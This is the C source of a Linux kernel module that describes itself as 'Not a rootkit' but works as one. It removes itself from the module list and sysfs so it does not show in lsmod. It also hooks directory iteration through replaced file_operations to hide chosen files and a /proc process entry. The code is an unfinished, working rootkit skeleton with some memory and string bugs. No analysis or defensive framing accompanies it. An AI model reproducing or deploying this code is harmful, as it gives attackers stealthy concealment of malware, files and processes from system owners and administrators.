#include <linux/init.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yanay Goor");
MODULE_DESCRIPTION("Not a rootkit");
MODULE_VERSION("0.1.0");

static struct list_head *modules;

static char *test_path_name = "/home/yanayg/test_file";
static char *test_path_name2 = "/home/yanayg/test_file2";

static void hide_module(void) {
    // Save the list for later so we can add the module back in.
	modules = THIS_MODULE->list.prev;
	// Hide from procfs (lsmod)
	// TODO: This means that rmmod will not work, I need to provide a way for the module to unload itself.
	list_del(&THIS_MODULE->list);
	// Hide from sysfs (/sys/module)
	// kobject_del removes the kobject from the sysfs but does
	// not free it's memory (that only happens one the refcount is 0).
	// So it is save to call without causing an error later on when unloading the module.
	 kobject_del(&THIS_MODULE->mkobj.kobj);
	// ???
	// THIS_MODULE->sect_attrs = NULL;
	// ???
	// THIS_MODULE->notes_attrs = NULL;
}

static void unhide_module(void) {
	// Unhide from procfs (lsmod)
	list_add(&THIS_MODULE->list, modules);
}

static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
    struct path path;
    int retval;
    if ((retval = kern_path(path_name, LOOKUP_FOLLOW, &path))) {
        return retval;
    }
    *inode = path.dentry->d_inode;
    printk(KERN_INFO "Path name: %s, inode: %lu\n", path_name, (*inode)->i_ino);
    path_put(&path);
    return 0;
}

struct fops_hook {
    struct list_head head;
    unsigned long ino;
    struct file_operations *fops;
    struct file_operations *prev_fops;
    unsigned int refcount;
};

static LIST_HEAD(fops_hooks);

static int create_fops_hook(struct inode *inode, struct file_operations **file_operations) {
	struct fops_hook *fops_hook;

	*file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
	memcpy(*file_operations, inode->i_fop, sizeof(struct file_operations));

	fops_hook = (struct fops_hook *)kmalloc(sizeof(struct fops_hook), GFP_KERNEL);
	fops_hook->ino = inode->i_ino;
	fops_hook->fops = *file_operations;
	fops_hook->prev_fops = inode->i_fop;
    fops_hook->refcount = 1;
	list_add(&fops_hook->head, &fops_hooks);

	inode->i_fop = *file_operations;
	return 0;

}

static int free_fops_hook(struct inode *inode) {
    struct list_head *pos;
    struct fops_hook *entry;
    unsigned int refcount;

	list_for_each(pos, &fops_hooks) {
	    entry = list_entry(pos, struct fops_hook, head);
	    if (entry->ino == inode->i_ino) {
            refcount = --(entry->refcount);
            if (refcount) return 0;
	        kfree(inode->i_fop);
	    	inode->i_fop = entry->prev_fops;
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}

static struct fops_hook *get_fops_hook(const struct inode *inode) {
    struct list_head *pos;
    struct fops_hook *entry;
	list_for_each(pos, &fops_hooks) {
	    entry = list_entry(pos, struct fops_hook, head);
	    if (entry->ino == inode->i_ino) {
	        return entry;
	    }
	}
	return NULL;
}

struct hidden_file_entry {
    struct list_head head;
    unsigned long ino;
    char *file_name;
};

static LIST_HEAD(hidden_files);

static int create_hidden_file_entry(const struct inode *inode, const char *file_name) {
	char *inner_file_name;
	struct hidden_file_entry *hidden_file;

	inner_file_name = (char *)kmalloc(sizeof(char) + strlen(file_name), GFP_KERNEL);
	strcpy(inner_file_name, file_name);

	hidden_file = (struct hidden_file_entry *)kmalloc(sizeof(struct hidden_file_entry), GFP_KERNEL);
	hidden_file->ino = inode->i_ino;
	hidden_file->file_name = inner_file_name;

	list_add(&hidden_file->head, &hidden_files);
	return 0;
}

static int free_hidden_file_entry(const struct inode *inode, const char *file_name) {
    struct list_head *pos;
    struct hidden_file_entry *entry;
	list_for_each(pos, &hidden_files) {
	    entry = list_entry(pos, struct hidden_file_entry, head);
	    if (entry->ino == inode->i_ino && !strcmp(entry->file_name, file_name)) {
	        kfree(entry->file_name);
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}

struct hooked_dir_context {
    struct list_head head;
    struct dir_context *ctx;
    filldir_t prev_actor;
    unsigned long ino;
};

static LIST_HEAD(hooked_dir_context_list);

static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
    struct list_head *pos;
    struct list_head *file_pos;
    struct hooked_dir_context *entry;
    struct hidden_file_entry *hidden_file;

	list_for_each(pos, &hooked_dir_context_list) {
	    entry = list_entry(pos, struct hooked_dir_context, head);
	    if (entry->ctx == ctx) {
	    	printk(KERN_INFO "Called hooked actor! %s", name);
	        list_for_each(file_pos, &hidden_files) {
	            hidden_file = list_entry(file_pos, struct hidden_file_entry, head);
                if (hidden_file->ino == entry->ino && !strcmp(name, hidden_file->file_name)) {
                    return 0;
                }
	        }
	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
	    }
	}
	return -1;
}

static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
    struct hooked_dir_context *hook;
    struct fops_hook *fops_hook;
	printk(KERN_INFO "Called hooked iterate!");
	hook = (struct hooked_dir_context *)kmalloc(sizeof(struct hooked_dir_context), GFP_KERNEL);
	hook->ctx = dir_context;
	hook->prev_actor = dir_context->actor;
	hook->ino = filp->f_inode->i_ino;
	list_add(&hook->head, &hooked_dir_context_list);
	dir_context->actor = new_actor;
	fops_hook = get_fops_hook(filp->f_inode);
	if (fops_hook == NULL) return -1;
	return fops_hook->prev_fops->iterate_shared(filp, dir_context);
}

static char *strtok_r(char *str, const char *delim) {
    int i = strlen(str) - 1;
    while (str[i] != '\0') {
        if (!memcmp(str + i, delim, sizeof(char) * strlen(delim))) {
            str[i] = '\0';
            return str + i + strlen(delim);
        }
        i--;
    }
    return NULL;
}

static int hide_file(const char *path_name) {
    int retval;
	char *dir_path;
	char *file_name;
	struct inode *inode;
	struct fops_hook *fops_hook;
	struct file_operations *file_operations;

	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
	strcpy(dir_path, path_name);
    file_name = strtok_r(dir_path, "/");

	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
	    return retval;
	}

	if ((retval = create_hidden_file_entry(inode, file_name))) {
	    return retval;
	}
	kfree(dir_path);

	fops_hook = get_fops_hook(inode);
	if (fops_hook != NULL) {
	    fops_hook->refcount++;
	    fops_hook->fops->iterate_shared = new_iterate_shared;
	    return 0;
	}

	if ((retval = create_fops_hook(inode, &file_operations))) {
	    free_hidden_file_entry(inode, file_name);
	    return retval;
	}

	file_operations->iterate_shared = new_iterate_shared;

	return 0;
}

static int unhide_file(const char *path_name) {
    int retval;
	char *dir_path;
	char *file_name;
	struct inode *inode;

	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
	strcpy(dir_path, path_name);
    file_name = strtok_r(dir_path, "/");

	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
	    return retval;
	}

    if ((retval = free_hidden_file_entry(inode, file_name))) {
	    return retval;
	}
    kfree(dir_path);

	return free_fops_hook(inode);
}

static int __init MRK_initialize(void) {
	hide_file(test_path_name);
	hide_file(test_path_name2);
	hide_file("/proc/22");
	unhide_file(test_path_name2);
	hide_module();
	printk(KERN_INFO "Hello, World!\n");
	return 0;
}


static void __exit MRK_exit(void) {
    unhide_module();
	printk(KERN_INFO "Goodbye, World!\n");
}

module_init(MRK_initialize);
module_exit(MRK_exit);
